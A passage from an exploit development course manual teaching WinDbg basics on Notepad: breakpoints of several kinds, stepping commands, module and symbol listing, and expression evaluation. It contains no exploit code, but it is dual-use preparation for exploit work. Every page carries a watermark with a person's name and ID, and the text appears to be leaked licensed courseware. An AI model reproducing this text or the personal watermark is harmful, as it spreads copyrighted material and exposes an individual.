Listing 21 - Setting a breakpoint on the WriteFile 
Remember, when first attached to WinDbg, the execution flow of the application is stopped. After 
setting up the desired breakpoints, we have to let the execution continue by issuing the g 
command. 
With our breakpoint in place, let’s proceed to write content in Notepad and then save the content 
to a file. This should trigger our breakpoint: 
0:005> g 
Breakpoint 0 hit 
eax=007bec80 ebx=00a9bb18 ecx=9e56da2d edx=00a9bb46 esi=00000017 edi=088f9630 
eip=767ec6d0 esp=007bec60 ebp=007bec94 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206 
KERNEL32!WriteFile: 
767ec6d0 ff2590448476    jmp     dword ptr [KERNEL32!_imp__WriteFile (76844490)] 
ds:0023:76844490={KERNELBASE!WriteFile (7466b160)} 
Listing 22 - Halting the execution in notepad.exe by setting a breakpoint on the WriteFile 
As shown in the listing above, we hit our breakpoint. Additionally, WinDbg shows the current 
values of all the general purpose registers as well as the address and assembly instruction where 
our breakpoint was triggered. 
During a debugging session, it can also be handy to disable and enable breakpoints using the bd 
(disable) and be (enable) commands, respectively. These commands accept the breakpoint 
numbers listed by bl as arguments. 
0:000> bd 0 
 
0:000> bl 
     0 d Enable Clear  767ec6d0     0001 (0001)  0:**** KERNEL32!WriteFile 
      
0:000> be 0 
 
0:000> bl 
     0 e Disable Clear  767ec6d0     0001 (0001)  0:**** KERNEL32!WriteFile 
Listing 23 - Setting, disabling, listing and clearing breakpoints 
 
32 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
43 
In Listing 23, we disable and enable breakpoint 0 on the WriteFile API. 
During long debugging sessions, it’s easy to end up with a long list of enabled and/or disabled 
breakpoints. It’s good practice to keep our workspace tidy, and therefore we need to learn how to 
clear breakpoints. We can do this using the bc command, along with the breakpoint number. To 
clear all the breakpoints, we can use the wildcard (*) argument instead of the breakpoint number. 
0:000> bl 
     0 e Disable Clear  767ec6d0     0001 (0001)  0:**** KERNEL32!WriteFile 
      
0:000> bc 0 
 
0:000> bl 
Listing 24 - Setting, disabling, listing and clearing breakpoints 
Understanding how software breakpoints work, as well as how to use them, is vital while 
performing exploit development or reverse engineering. Take the time to get comfortable with 
using software breakpoints in various scenarios. 
2.4.1.1 Exercises 
1. 
Attach WinDbg to a new instance of Notepad and set a breakpoint on the WriteFile API as 
shown. 
2. 
Trigger the breakpoint by saving the document in Notepad. 
3. 
Experiment with the breakpoint commands to list, disable, enable, and clear breakpoints. 
4. 
Can you determine where you need to set a breakpoint that will be triggered when reading a 
text file? 
2.4.2 Unresolved Function Breakpoint 
We can use the bu command to set a breakpoint on an unresolved function. This is a function 
residing in a module that isn’t yet loaded in the process memory space. In this case, the 
breakpoint will be enabled when the module is loaded and the target function is resolved. 
Refer to MSDN33 to learn more about the difference between resolved and 
unresolved breakpoints. 
Here is an example of the bu command applied to Notepad. The module OLE32.dll is not initially 
loaded in the notepad.exe process, but is loaded once a file is saved. Once WinDbg is attached to 
the notepad.exe process, we will set an unresolved breakpoint on a arbitrary OLE32 function, 
OLE32!WriteStringStream (Listing 25). 
0:005> lm m ole32 
Browse full module list 
 
33 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/unresolved-breakpoints---bu-
breakpoints- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
44 
start    end        module name 
 
0:005> bu ole32!WriteStringStream 
 
0:005> bl 
     0 e Disable Clear u            0001 (0001) (ole32!WriteStringStream) 
Listing 25 - Unresolved breakpoint on ole32!WriteStringStream 
After resuming Notepad execution and saving a file, we notice that OLE32.dll has been loaded: 
0:005> g 
[...] 
ModLoad: 74ce0000 74dd7000   C:\Windows\System32\ole32.dll 
[...] 
Listing 26 - ole32 module has loaded 
Observing the module has loaded in Listing 26, we can confirm that our breakpoint is now 
resolved by breaking the application flow. Let’s do this by clicking the Break button shown in 
Figure 12. 
 
Figure 12: Break button in WinDbg GUI 
Finally, we can check on our breakpoint with the bl command: 
(fac.fa4): Break instruction exception - code 80000003 (first chance) 
eax=02d61000 ebx=00000000 ecx=76fb9bc0 edx=01008802 esi=76fb9bc0 edi=76fb9bc0 
eip=76f81430 esp=0915fd44 ebp=0915fd70 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
ntdll!DbgBreakPoint: 
76f81430 cc              int     3 
0:005> bl  
      0 e Disable Clear  74d01cd0     0001 (0001)  0:**** ole32!WriteStringStream 
Listing 27 - Resolved breakpoint on ole32!WriteStringStream 
It is important to remember that while the breakpoint is resolved when ole32.dll is loaded, it is 
not triggered. This is because our actions in Notepad did not force a call to 
ole32!WriteStringStream. 
Next, we will learn how to leverage WinDbg and use breakpoints to trigger specific actions. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
45 
2.4.2.1 Exercises 
1. 
Attach WinDbg to a new instance of Notepad and set an unresolved breakpoint on an API in 
ole32.dll. 
2. 
Trigger the loading of ole32.dll by saving a file and viewing how the breakpoint becomes 
resolved. 
2.4.3 Breakpoint-Based Actions 
We can also automate the execution of commands within the debugger when a breakpoint34 is 
triggered. This enables us to print the register’s content, dereference memory locations, and 
perform other powerful actions when a breakpoint is hit. 
Let’s consider the example in Listing 28. WinDbg is attached to Notepad and we want to display 
the number of bytes written to a file in the debugger window. To do this, we can execute the 
.printf35 command every time the breakpoint set on the kernel32!WriteFile API is triggered using 
the syntax shown below: 
0:005> bp kernel32!WriteFile ".printf \"The number of bytes written is: %p\", poi(esp 
+ 0x0C);.echo;g" 
Listing 28 - Printing the number of bytes written once the breakpoint set on WriteFile is hit. 
Similar to the C/C++ version, .printf supports the use of format strings36 such as %p, which will 
display the given value as a pointer. In our example, the .echo command displays the output of 
.printf to the WinDbg command window. The semi-colon (;) delimiter separates multiple 
commands assigned to a single breakpoint and executes them in the order listed. 
In our case, we chose to display the value pointed to by the ESP register at offset 0x0C (12 bytes), 
which corresponds to the number of bytes to write to the target file (third argument) when 
kernel32!WriteFile is called. This is defined in the WriteFile prototype: 
BOOL WriteFile( 
  HANDLE       hFile, 
  LPCVOID      lpBuffer, 
  DWORD        nNumberOfBytesToWrite, 
  LPDWORD      lpNumberOfBytesWritten, 
  LPOVERLAPPED lpOverlapped 
); 
 
Listing - 29 - WriteFile function prototype 
This is because the Windows x86 API makes use of the __stdcall calling convention in which the 
function arguments are pushed on the stack in reverse order (right to left). In this case, each 
argument occupies four bytes of memory on the stack.37 
 
34 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/command-tokens 
35 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-printf 
36 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Printf_format_string 
37 Handles, pointers and dwords are all 4 bytes on Windows x86. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
46 
After we set up our breakpoint, we let the application continue execution using g and then 
proceed to type a string in Notepad and save it to a file. WinDbg should then print the length of 
the string we saved, as shown below: 
0:005> g 
[SNIP...] 
The number of bytes written is: 00000003 
The number of bytes written is: 00000006 
The number of bytes written is: 00000012 
Listing - 30 - .printf outputs the number of bytes written to a file 
Another powerful feature of WinDbg is the ability to set conditional breakpoints. As the name 
suggests, conditional breakpoints break the execution flow only if a specific condition is satisfied. 
In the following example, we are going to use the .if and .else commands38 to set a conditional 
breakpoint on the kernel32!WriteFile Windows API again. In this example, we will halt the 
execution flow only if we write exactly four bytes of data to a file from Notepad. We can 
accomplish this with the following syntax: 
0:001> bp kernel32!WriteFile ".if (poi(esp + 0x0C) != 4) {gc} .else {.printf \"The 
number of bytes written is 4\";.echo;}" 
 
0:001> g 
Listing 31 - Setting a conditional breakpoint. 
When our breakpoint on WriteFile is triggered, we use gc (go from conditional breakpoint) to 
resume execution, unless the nNumberOfBytesToWrite argument (third argument on the stack) is 
equal to “4”. 
If this is the case, the string “The number of bytes written is 4” is printed to the command window, 
as shown in Listing 32. 
The number of bytes written is 4 
eax=002fe740 ebx=0081b3a8 ecx=dae4b044 edx=0081b3b0 esi=00000004 edi=068eb378 
eip=7560c6d0 esp=002fe720 ebp=002fe754 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
KERNEL32!WriteFile: 
7560c6d0 ff2590446675    jmp     dword ptr [KERNEL32!_imp__WriteFile (75664490)] 
ds:0023:75664490={KERNELBASE!WriteFile (742ab160)} 
Listing 32 - The execution halts only when the EAX register is non zero. 
We can also combine conditional breakpoints with the .printf command. This can be useful, for 
example, if the debugged code performs a loop and we want to monitor some memory content or 
CPU register value at every iteration without breaking execution flow. 
The examples shown in this section are rather basic, but mastering the use of breakpoint 
commands can accelerate our efforts by automating many tedious tasks. 
Next, we are going to explore hardware breakpoints and see their benefits over software 
breakpoints. 
 
38 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-a-conditional-breakpoint 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
47 
2.4.3.1 Exercises 
1. 
Experiment with the .printf command to display memory content when a breakpoint is 
triggered. 
2. 
Experiment with the .if and .else commands to only break on a specific number of written 
bytes. 
3. 
When breaking at the kernel32!WriteFile function, try to determine if the number of written 
bytes is also found in a register. If so, try to change the conditional breakpoint to examine 
that register rather than the argument on the stack. 
2.4.4 Hardware Breakpoints 
Hardware or processor breakpoints39 are handled by the processor and stored in the processor’s 
debug registers.40 They can stop code execution when a particular type of access, such as read, 
write, or execute,41 is made to a targeted memory location. 
The primary advantage of hardware breakpoints is that they provide the ability to monitor 
changes or access to data in memory. This can be a timesaver when we reverse engineer code. 
However, the x86 and x64 architectures only use four debug registers, so unlike software 
breakpoints, we are limited by the number of processor breakpoints. 
To set a hardware breakpoint in WinDbg, we need to pass three arguments to the ba command. 
The first is the type of access, which can be either e (execute), r (read), or w (write). The second 
one is the size in bytes for the specified memory access, and finally, the third argument is the 
memory address where we want to set the breakpoint at.42 
In the next example, we are going to set a hardware breakpoint on the execution of the WriteFile 
API. The outcome is equivalent to setting a software breakpoint, but in this case, we leverage the 
CPU and the debug registers, rather than altering the code with an INT 3 instruction. 
0:000> ba e 1 kernel32!WriteFile 
 
0:000> g 
Listing 33 - Setting a hardware breakpoint on execute access 
Similar to a software breakpoint, we must allow execution to continue and save a file to disk to 
trigger our breakpoint. 
Breakpoint 1 hit 
eax=02e3ee20 ebx=02fb7ba0 ecx=55c78079 edx=02fb7be0 esi=00000020 edi=086ee1a8 
eip=767ec6d0 esp=02e3ee00 ebp=02e3ee34 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202 
KERNEL32!WriteFile: 
 
39 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/processor-breakpoints---ba-breakpoints- 
40 (Wikipedia, 2019), https://en.wikipedia.org/wiki/X86_debug_register 
41 In kernel debugging it’s possible to set a hardware breakpoint also when the I/O port at the specified Address is accessed. This 
particular processor breakpoint can be set through the “i” access parameter. 
42 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/ba--break-on-access- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
48 
767ec6d0 ff2590448476    jmp     dword ptr [KERNEL32!_imp__WriteFile (76844490)] 
ds:0023:76844490={KERNELBASE!WriteFile (7466b160)} 
Listing 34 - Hitting the hardware breakpoint on execute access 
As shown in the listing above, when the breakpoint is hit, the output is identical to the one 
obtained through a software breakpoint. 
Let’s move on to a more interesting case and experiment with hardware breakpoints and a 
different type of memory address. In the next example, we are going to write a string in Notepad 
and search for that string in memory with the help of the debugger. Once we find our data in 
memory, we’ll set a hardware breakpoint on write access at the memory address where our string 
is located. We’ll then resume program execution and attempt to change our string from within 
Notepad. At this point, we expect our breakpoint to be triggered since the program will attempt to 
access our string in memory to change it. 
The first step is to write our string in Notepad. We’ll use a string (“w00tw00t”) that hopefully 
should not already be in the notepad.exe memory space, as ideally we want our search to return a 
single result. Then, we’ll save the file, close the Notepad application, and re-open the text file by 
double-clicking it. We will then attach WinDbg to the Notepad process, which will halt the 
execution. 
The steps outlined above (saving the file, closing Notepad, and re-opening the 
file) are essential to obtain a single instance of the string in memory. Deviation 
from these steps will produce different results, making the following example 
hard to follow. 
We then proceed to search the entire memory space of the application for our unique string 
within WinDbg. We’ll search for both ASCII (s -a) and Unicode (s -u) strings, as shown below: 
0:002> s -a 0x0 L?80000000 w00tw00t 
 
0:002> s -u 0x0 L?80000000 w00tw00t 
03b2c768  0077 0030 0030 0074 0077 0030 0030 0074  w.0.0.t.w.0.0.t. 
Listing 35 - Searching for our unique string in the Notepad memory space 
Listing 35 shows that we were presented with one search result and our string has been saved to 
memory in Unicode format. 
We will set a hardware breakpoint on the memory address found by our search. Specifically, we 
will set a breakpoint on write access at the first two bytes of our Unicode string (0x00 and 0x77 at 
address 0x03b2c768 in Listing 35). By doing this, the execution should break only if our changes 
to the string in Notepad affect the first character of the “w00tw00t” string. 
0:002> ba w 2 03b2c768 
 
0:002> bl 
     0 e Disable Clear  03b2c768 w 2 0001 (0001)  0:****  
      
0:002> g 
Listing 36 - Setting hardware breakpoint on write access 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
49 
Now that the breakpoint is set and the execution is resumed, let’s test it by selecting the entire 
string in Notepad and replacing it with a single lowercase case “a” character. 
Breakpoint 0 hit 
eax=03a5f861 ebx=03a5f884 ecx=00000000 edx=00000002 esi=03a5f8ec edi=03b2c768 
eip=773c8a6c esp=03a5f824 ebp=03a5f82c iopl=0         nv up ei ng nz ac po cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293 
msvcrt!memmove+0x19c: 
773c8a6c 8a4601          mov     al,byte ptr [esi+1]        ds:0023:03a5f8ed=00 
Listing 37 - Hitting the hardware breakpoint on write access 
The breakpoint halts execution at the program instruction following the one that altered our 
Unicode string buffer. The previous instruction can be found in the WinDbg disassembly window, 
as shown in Figure 13. 
 
Figure 13: Assembly instruction that changed our string 
According to Figure 13, the instruction that triggered our hardware breakpoint was mov byte ptr 
[edi],al, part of the memmove43 function located in msvcrt.dll. Notice how the EDI register points to 
our Unicode string: 
0:000> du edi 
03b2c768  "a00tw00t" 
 
0:000> bc *  
 
0:000> g 
Listing 38 - Inspecting our string after the breakpoint has been hit 
 
43 (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memmove-wmemmove?view=msvc-160 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
50 
Interestingly enough, Notepad appears to keep the original string in memory except for the 
character we changed (in this case the lower case “a” ASCII character). Why this happens strictly 
depends on how the application code handles changes on the data and is beyond the scope of 
this exercise. However, we were able to identify the code that modified our string in memory. 
Hardware breakpoints can be extremely useful when trying to find where data is being handled 
during the execution flow of an application. Getting comfortable with them and recognizing when 
to use them can save significant time during both reverse engineering and exploit development. 
2.4.4.1 Exercises 
1. 
Experiment with hardware breakpoints to trigger a break when executing the WriteFile API. 
2. 
Replicate the above example but change the hardware breakpoint to trigger when you 
attempt to replace the last letter of the string. 
2.4.5 Stepping Through the Code 
After halting the application flow, we can use p and t to step over, and into each instruction, 
respectively. 
Specifically, the p command will execute one single instruction at a time and steps over function 
calls, and t will do the same, but will also step into function calls. 
Let’s restart Notepad and re-attach WinDbg to it. Once attached, we will set a software breakpoint 
at the kernelbase!CreateFileW API and let the execution continue (g). 
With our breakpoint set, we will try to write an arbitrary string in the application and attempt to 
save the file, which should trigger our breakpoint. In order to demonstrate the previously 
mentioned commands, we will set another breakpoint at kernelbase!CreateFileW+0x53 and once 
again let the execution flow resume. 
Listing 39 shows the use of the p and t commands to increment execution one instruction at a 
time. At the call instruction,44 the “step into” command transitions execution into the nested 
function and continues debugging at the function’s first instruction. 
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798 
eip=74bb61f3 esp=003cadb8 ebp=003caddc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileW+0x53: 
74bb61f3 ff7518          push    dword ptr [ebp+18h]  ss:0023:003cadf4=00000003 
 
0:000> p 
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798 
eip=74bb61f6 esp=003cadb4 ebp=003caddc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileW+0x56: 
74bb61f6 ff7510          push    dword ptr [ebp+10h]  ss:0023:003cadec=00000007 
 
0:000> p 
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798 
 
44 (Aldeid, 2015), https://www.aldeid.com/wiki/X86-assembly/Instructions/call 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
51 
eip=74bb61f9 esp=003cadb0 ebp=003caddc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileW+0x59: 
74bb61f9 e812000000      call    KERNELBASE!CreateFileInternal (74bb6210) 
 
0:000> t 
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798 
eip=74bb6210 esp=003cadac ebp=003caddc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileInternal: 
74bb6210 8bff            mov     edi,edi 
Listing 39 - Stepping through the code and following the execution flow 
We can use the “step into” and “step over” commands interchangeably, except when encountering 
a call instruction. In Listing 40, the same piece of code is executed, but we step over the call 
instead. 
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798 
eip=74bb61f9 esp=003cadb0 ebp=003caddc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileW+0x59: 
74bb61f9 e812000000      call    KERNELBASE!CreateFileInternal (74bb6210) 
0:000> p 
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798 
eip=74bb61f9 esp=003cadb0 ebp=003caddc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileW+0x5e: 
74bb61fe 8be5            mov     esp,ebp 
Listing 40 - Stepping over the function call 
Here we observe that with the p command, we’ll continue through the application without taking 
any detours through nested functions. 
Another convenient command is pt45 (step to next return), which allows us to fast-forward to the 
end of a function. 
eax=003cadc0 ebx=00000007 ecx=0630b798 edx=80000000 esi=00000000 edi=0630b798 
eip=74bb6210 esp=003cadac ebp=003caddc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileInternal: 
74bb6210 8bff            mov     edi,edi 
 
0:000> pt 
eax=000007f8 ebx=00000007 ecx=226410a5 edx=00000000 esi=00000000 edi=0630b798 
eip=74bb6580 esp=003cadac ebp=003caddc iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246 
KERNELBASE!CreateFileInternal+0x370: 
74bb6580 c21000          ret     10h 
Listing 41 - Execute until return 
The listing above shows the execution continuing until the first ret instruction, which is typically at 
the end of the current function. 
 
45 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/pt--step-to-next-return- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
52 
Like the pt command, ph46 executes code until a branching instruction is reached. This includes 
conditional or unconditional branches, function calls, and return instructions. 
We have covered the main tools that help us step through the application’s code. Now let’s dive 
into additional WinDbg features. 
2.4.5.1 Exercises 
1. 
Launch WinDbg and attach it to a new instance of Notepad. 
2. 
Set a breakpoint on kernel32!WriteFile and trigger it by saving a file. 
3. 
Step through the instructions using the p, t, ph, and pt commands. Make sure you 
understand the differences between them. 
2.5 Additional WinDbg Features 
So far, we have discussed how to access and manipulate memory as well as how we can control 
the execution flow of the debugged application. 
Next, we’ll explore additional WinDbg functionality such as evaluations, conversions, and pseudo-
registers. 
2.5.1 Listing Modules and Symbols in WinDbg 
It’s often useful to inspect which modules have been loaded in the process memory space. 
We can issue the lm command to display all loaded modules, including their starting and ending 
addresses in virtual memory space: 
0:007> lm 
start    end        module name 
002b0000 002ef000   notepad    (deferred)              
611e0000 61236000   oleacc     (deferred)              
68a70000 68ae6000   efswrt     (deferred)              
69c30000 69c47000   MPR        (deferred)              
69ce0000 69d4c000   WINSPOOL   (deferred)    
[...] 
Listing 42 - Listing loaded modules 
The fourth column of Listing 42 provides information about the symbol files for a given module. 
When we execute the command against a freshly opened instance of Notepad, no symbols are 
loaded. However, we can force a reload of the symbols with .reload /f and then relist the 
modules: 
0:007> .reload /f 
Reloading current modules 
................................................... 
 
0:007> lm 
start    end        module name 
 
46 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/ph--step-to-next-branching-instruction- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
53 
002b0000 002ef000   notepad    (pdb symbols)          
c:\symbols\notepad.pdb\FB4FCA58AFCC3ACA154240CE7B7A58131\notepad.pdb 
611e0000 61236000   oleacc     (pdb symbols)          
c:\symbols\oleacc.pdb\170302085B3679B8C6F657898A44607E1\oleacc.pdb 
68a70000 68ae6000   efswrt     (pdb symbols)          
c:\symbols\efswrt.pdb\7E1B78CB6EF19B073B4F4A354501F7D31\efswrt.pdb 
69c30000 69c47000   MPR        (pdb symbols)          
c:\symbols\mpr.pdb\8E907DDAD5CCF1C8EE24214E569B592E1\mpr.pdb 
69ce0000 69d4c000   WINSPOOL   (pdb symbols)          
c:\symbols\winspool.pdb\6E59EFAE2D1C35E1E07A45A4EDE324681\winspool.pdb 
[...] 
Listing 43 - Loading symbols and listing loading modules 
When a PDB file is not available for a given module, WinDbg will default to the 
export symbols mode. In this case, the debugger will attempt to gather the 
names of the symbols exported by the module through the Export Directory 
Table.47 
The lm command can also filter modules by accepting the wildcard (*) character, together with 
the module pattern parameter m. In Listing 44, we are filtering to show all modules starting with 
“kernel”: 
0:007> lm m kernel* 
Browse full module list 
start    end        module name 
73c70000 73c7e000   kernel_appcore   (pdb symbols)          
c:\symbols\Kernel.Appcore.pdb\E809C8B1302B9976E49A0476E5D627491\Kernel.Appcore.pdb 
73ce0000 73eb8000   KERNELBASE   (pdb symbols)          
c:\symbols\kernelbase.pdb\13D9C53AB6F8551B30ABB78D4F9A1F8A1\kernelbase.pdb 
74a80000 74b15000   KERNEL32   (pdb symbols)          
c:\symbols\kernel32.pdb\EFA698598E9A5A3CB89EC02E7DE288041\kernel32.pdb 
Listing 44 - Listing only specific modules 
Once we have the list of modules, we can learn more about their symbols by using the x 
(examining symbol) command.48 In the following example, we dump information regarding the 
symbols present from the KERNELBASE module. Notice how we use the wildcard to display all 
the symbols that start with “CreateProc”: 
0:002> x kernelbase!CreateProc* 
752362e4          KERNELBASE!CreateProcessExtensions::ErrorContext::LogError (<no 
parameter info>) 
751f2670          KERNELBASE!CreateProcessAsUserA (<no parameter info>) 
751ed550          KERNELBASE!CreateProcessAsUserW (<no parameter info>) 
751d6ace          KERNELBASE!CreateProcessExtensions::IsDefaultBrowserCreation (<no 
parameter info>) 
751ecba4          KERNELBASE!CreateProcessExtensions::ReleaseAppXContext (<no 
parameter info>) 
 
47 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table 
48 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x--examine-symbols- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
54 
751d7564          
KERNELBASE!CreateProcessExtensions::VerifyParametersAndGetEffectivePackageMoniker (<no 
parameter info>) 
752360e6          KERNELBASE!CreateProcessExtensions::CreateSharedLocalFolder (<no 
parameter info>) 
751d6cb2          KERNELBASE!CreateProcessExtensions::PreCreationExtension (<no 
parameter info>) 
751c1010          KERNELBASE!CreateProcessInternalW (<no parameter info>) 
751c4ad0          KERNELBASE!CreateProcessA (<no parameter info>) 
751c4e70          KERNELBASE!CreateProcessW (<no parameter info>) 
751c3630          KERNELBASE!CreateProcessInternalA (<no parameter info>) 
Listing 45 - Listing functions by partial symbol 
The x command from Listing 45 can be very useful to quickly dump symbols if we either don’t 
know or can’t remember the full name. 
2.5.2 Using WinDbg as a Calculator 
Doing calculations in a debugger might seem trivial, but it saves us the annoyance of switching 
between applications during the debugging process. 
Mathematical calculations are performed by the evaluate expression command, ?.49 We often 
have to perform tasks such as finding the difference between two addresses or finding lower or 
upper byte values of a DWORD. WinDbg easily solves this, as shown in Listing 46: 
0:007> ? 77269bc0  - 77231430  
Evaluate expression: 231312 = 00038790 
 
0:007> ? 77269bc0 >> 18 
Evaluate expression: 119 = 00000077 
Listing 46 - Using WinDbg as a calculator 
The input for ? is assumed to be in hex format unless we use the 0n or 0y prefix discussed in the 
next section. 
Using WinDbg as a calculator, we can perform mathematical operations like addition, subtraction, 
multiplication, and division, plus complex operations such as modulo, exponent, and left and right 
bitwise shifting. 
2.5.3 Data Output Format 
By default, WinDbg displays content in hexadecimal format. However, sometimes we will need 
data in a different form. 
Fortunately, we can convert the hex representation to decimal or binary format. We can do this 
with the 0n and 0y prefixes respectively. We can observe some conversion examples shown 
below using the evaluate expression command ?. 
0:000> ? 41414141 
Evaluate expression: 1094795585 = 41414141 
 
 
49 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/---evaluate-expression- 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
55 
0:000> ? 0n41414141 
Evaluate expression: 41414141 = 0277edfd 
 
0:000> ? 0y1110100110111 
Evaluate expression: 7479 = 00001d37 
Listing 47 - Converting between formats in WinDbg 
Here we convert the hex number 41414141 to decimal, then convert the decimal number 
0n41414141 to hexadecimal, and finally we convert the binary 0y1110100110111 to decimal and 
hexadecimal. 
The .formats command is also useful for converting between different formats at once, 
including the ASCII representation of the value as shown below. 
0:000> .formats 41414141 
Evaluate expression: 
  Hex:     41414141 
  Decimal: 1094795585 
  Octal:   10120240501 
  Binary:  01000001 01000001 01000001 01000001 
  Chars:   AAAA 
  Time:    Fri Sep 10 07:53:05 2004 
  Float:   low 12.0784 high 0 
  Double:  5.40901e-315 
Listing 48 - The .formats command can be really useful 
2.5.3.1 Exercise 
1. 
Experiment with the data format conversion using both the specific data type prefixes and 
the .formats command. 
2.5.4 Pseudo Registers 
WinDbg has a series of Pseudo Registers.50 These are not registers used by the CPU but are 
variables pre-defined by WinDbg. Many of these pseudo registers, like $teb, which we used earlier, 
have a predefined meaning. 
There are 20 user-defined pseudo registers named $t0 to $t19 that can be used as variables 
during mathematical calculations. We can also perform calculations by directly using these 
pseudo registers together with explicit values. 
When using pseudo registers as well as regular registers, it is recommended to 
prefix them with the “@” character. This tells WinDbg to treat the content as a 
register or pseudo register. It speeds up the evaluation process because WinDbg 
will not try to resolve it as a symbol first. 
Sometimes we have to perform complicated calculations when reverse engineering or developing 
an exploit. A somewhat complicated fictitious calculation is shown in Listing 49. 
 
50 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/pseudo-register-syntax 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
56 
0:000> ? ((41414141 - 414141) * 0n10) >> 8 
Evaluate expression: 42598400 = 028a0000 
Listing 49 - Performing complicated calculations 
The same calculation can be performed with a pseudo register. Here we use the $t0 pseudo 
register and store the value of the first calculation. Then we read the $t0 register and WinDbg 
outputs the result to verify the value. Finally, we right-shift $t0 by 8 bits to get the final result. This 
process is shown in Listing 50. 
0:000> r @$t0 = (41414141 - 414141) * 0n10 
 
0:000> r @$t0 
$t0=8a000000* 
 
0:000> ? @$t0 >> 8 
Evaluate expression: 42598400 = 028a0000 
